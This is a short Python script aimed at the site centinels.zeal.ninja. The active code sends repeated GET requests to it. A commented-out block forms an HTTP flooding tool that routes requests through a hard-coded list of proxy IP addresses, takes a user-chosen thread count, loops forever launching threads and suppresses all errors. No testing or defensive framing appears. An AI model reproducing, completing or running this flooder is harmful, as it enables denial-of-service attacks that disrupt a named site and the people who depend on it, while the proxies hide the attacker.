import requests
from fake_useragent import UserAgent
import random
import threading

def send_req(url):
    res = requests.get(url)

for i in range(10):
    send_req("https://centinels.zeal.ninja/")







# List of proxies
# proxies = [
#     'https://36.93.68.47:41890',
#     'https://186.3.91.110:999',
#     'https://113.160.37.152:53281',
#     'https://190.97.236.40:2023',
#     # Add more proxies as needed
# ]
#
# # Target URL
# target = 'https://centinels.zeal.ninja/'
#
# def send_request():
#     # Select a random proxy
#     proxy = random.choice(proxies)
#     try:
#         # Send a request using the proxy
#         requests.get(target, proxies={'https': proxy, 'https': proxy})
#     except:
#         pass
#
# # Get the number of threads from the user
# num_threads = int(input('Enter the number of threads: '))
#
# # Loop indefinitely
# while True:
#     # Create and start threads
#     threads = []
#     for _ in range(num_threads):
#         t = threading.Thread(target=send_request)
#         t.start()
#         threads.append(t)
#
#     # Wait for all threads to finish
#     for t in threads:
#         t.join()